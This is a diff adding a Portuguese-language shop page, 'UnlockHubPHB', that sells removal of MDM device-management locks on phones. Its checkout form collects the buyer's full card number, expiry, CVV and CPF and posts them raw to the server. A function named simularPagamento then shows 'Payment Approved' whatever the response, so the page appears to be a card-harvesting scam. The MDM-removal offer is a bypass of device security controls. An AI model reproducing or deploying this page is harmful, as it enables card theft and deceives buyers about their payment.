@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>Produtos - UnlockHubPHB</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+body{margin:0;font-family:'Poppins',sans-serif;background:#0a0a0a;color:white;}
+header{background:#111;padding:15px 30px;border-bottom:3px solid #ff6600;}
+header h1{margin:0;color:#ff6600;}
+.container{padding:40px;display:flex;flex-wrap:wrap;gap:25px;}
+.product{background:#111;border:2px solid #ff6600;padding:20px;width:250px;border-radius:10px;text-align:center;transition:0.3s;}
+.product:hover{transform:scale(1.03);}
+.product img{width:100%;border-radius:8px;}
+.product h3{color:#ff6600;}
+.price{color:#00ff99;font-weight:bold;margin:10px 0;}
+.product button{background:#ff6600;border:none;padding:10px 15px;border-radius:6px;cursor:pointer;font-weight:bold;}
+.product button:hover{background:#e65c00;}
+#checkoutModal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);justify-content:center;align-items:center;}
+.modal-content{background:#111;padding:30px;width:400px;border-radius:10px;border:2px solid #ff6600;text-align:center;}
+.modal-content input, .modal-content select{width:100%;padding:10px;margin:8px 0;border:none;border-radius:6px;}
+.modal-content button{padding:12px 20px;margin-top:10px;border:none;border-radius:6px;cursor:pointer;font-weight:bold;}
+.finalizar{background:#ff6600;color:white;}
+.cancelar{background:#333;color:white;margin-left:10px;}
+#aprovado{display:none;}
+.check{font-size:80px;color:#00ff00;}
+#suporte{position:fixed;bottom:20px;right:20px;background:#ff6600;width:60px;height:60px;border-radius:50%;display:flex;justify-content:center;align-items:center;cursor:pointer;}
+#suporte img{width:35px;}
+</style>
+</head>
+<body>
+
+<header>
+<h1>UnlockHubPHB</h1>
+</header>
+
+<div class="container">
+
+<!-- Produtos MDM -->
+<div class="product">
+<img src="https://cdn.pixabay.com/photo/2017/03/20/15/47/smartphone-2151995_1280.jpg">
+<h3>Remoção Realme C51</h3>
+<p class="price">100.00</p>
+<button onclick="abrirCheckout('Remoção Realme C51',100)">Comprar</button>
+</div>
+
+<div class="product">
+<img src="https://cdn.pixabay.com/photo/2016/11/29/09/32/apple-1867461_1280.jpg">
+<h3>MDM iOS</h3>
+<p class="price">150.00</p>
+<button onclick="abrirCheckout('MDM iOS',150)">Comprar</button>
+</div>
+
+<!-- Adicione mais produtos conforme necessário -->
+
+</div>
+
+<div id="suporte" onclick="abrirWhatsApp()">
+<img src="https://cdn-icons-png.flaticon.com/512/220/220236.png">
+</div>
+
+<!-- MODAL CHECKOUT -->
+<div id="checkoutModal">
+<div class="modal-content">
+
+<div id="formulario">
+<h2 id="produtoNome" style="color:#ff6600;"></h2>
+<p id="produtoPreco" class="price"></p>
+
+<input type="text" id="nome" placeholder="Nome completo" required>
+<input type="text" id="cpf" placeholder="CPF (somente números)" maxlength="11" oninput="apenasNumeros(this)" required>
+<input type="text" id="whatsapp" placeholder="WhatsApp" required>
+<input type="email" id="email" placeholder="Email" required>
+
+<select id="metodoPagamento" onchange="mostrarMetodo()">
+<option value="">Escolha forma de pagamento</option>
+<option value="pix">PIX</option>
+<option value="cartao">Cartão de Crédito</option>
+</select>
+
+<div id="pixInfo" style="display:none;margin-top:10px;color:#00ff99;">
+Chave PIX: unlockhub@pagamento.com
+</div>
+
+<div id="dadosCartao" style="display:none;">
+<input type="text" id="numeroCartao" placeholder="Número do Cartão">
+<input type="text" id="validade" placeholder="Validade MM/AA">
+<input type="text" id="cvv" placeholder="CVV">
+</div>
+
+<button class="finalizar" onclick="simularPagamento()">Finalizar Pagamento</button>
+<button class="cancelar" onclick="fecharCheckout()">Cancelar</button>
+</div>
+
+<div id="aprovado">
+<div class="check">✔</div>
+<h2 style="color:#00ff00;">Pagamento Aprovado!</h2>
+<p>Seu serviço foi confirmado com sucesso.</p>
+<button class="finalizar" onclick="fecharCheckout()">Fechar</button>
+</div>
+
+</div>
+</div>
+
+<script>
+function abrirWhatsApp(){
+window.open("https://wa.me/55169894948442","_blank");
+}
+
+function abrirCheckout(nome, preco){
+document.getElementById("checkoutModal").style.display="flex";
+document.getElementById("produtoNome").innerText=nome;
+document.getElementById("produtoPreco").innerText=preco.toFixed(2);
+document.getElementById("formulario").style.display="block";
+document.getElementById("aprovado").style.display="none";
+}
+
+function fecharCheckout(){
+document.getElementById("checkoutModal").style.display="none";
+}
+
+function mostrarMetodo(){
+let metodo=document.getElementById("metodoPagamento").value;
+document.getElementById("dadosCartao").style.display = metodo==="cartao" ? "block" : "none";
+document.getElementById("pixInfo").style.display = metodo==="pix" ? "block" : "none";
+}
+
+function apenasNumeros(campo){
+campo.value = campo.value.replace(/\D/g,'');
+}
+
+function validarCPF(cpf){
+cpf = cpf.replace(/\D/g,'');
+if(cpf.length!==11) return false;
+if(/^(\d)\1+$/.test(cpf)) return false;
+let soma=0, resto;
+for(let i=1;i<=9;i++) soma+=parseInt(cpf.substring(i-1,i))*(11-i);
+resto=(soma*10)%11; if(resto===10||resto===11) resto=0;
+if(resto!==parseInt(cpf.substring(9,10))) return false;
+soma=0;
+for(let i=1;i<=10;i++) soma+=parseInt(cpf.substring(i-1,i))*(12-i);
+resto=(soma*10)%11; if(resto===10||resto===11) resto=0;
+if(resto!==parseInt(cpf.substring(10,11))) return false;
+return true;
+}
+
+function validarCartao(numero){
+numero = numero.replace(/\D/g,'');
+if(numero.length < 13) return false;
+let soma = 0;
+let alternar = false;
+for(let i=numero.length-1;i>=0;i--){
+let n=parseInt(numero.charAt(i));
+if(alternar){n*=2;if(n>9)n-=9;}
+soma+=n;
+alternar=!alternar;
+}
+return (soma%10===0);
+}
+
+function simularPagamento(){
+let cpf=document.getElementById("cpf").value;
+let nome=document.getElementById("nome").value;
+let whatsapp=document.getElementById("whatsapp").value;
+let email=document.getElementById("email").value;
+let produto=document.getElementById("produtoNome").innerText;
+let preco=document.getElementById("produtoPreco").innerText;
+let metodo=document.getElementById("metodoPagamento").value;
+
+if(!validarCPF(cpf)){alert("CPF inválido!"); return;}
+if(metodo===""){alert("Escolha uma forma de pagamento!"); return;}
+
+let numeroCartao='', validade='', cvv='';
+if(metodo==="cartao"){
+numeroCartao=document.getElementById("numeroCartao").value;
+validade=document.getElementById("validade").value;
+cvv=document.getElementById("cvv").value;
+if(!validarCartao(numeroCartao)){alert("Número do cartão inválido!"); return;}
+if(validade.length<4){alert("Validade inválida!"); return;}
+if(cvv.length<3){alert("CVV inválido!"); return;}
+}
+
+fetch('/checkout',{
+method:'POST',
+headers:{'Content-Type':'application/x-www-form-urlencoded'},
+body:`nome=${nome}&cpf=${cpf}&whatsapp=${whatsapp}&email=${email}&produto=${produto}&preco=${preco}&metodo=${metodo}&numeroCartao=${numeroCartao}&validade=${validade}&cvv=${cvv}`
+}).then(res=>{
+document.getElementById("formulario").style.display="none";
+document.getElementById("aprovado").style.display="block";
+});
+}
+</script>
+
+</body>
+</html>
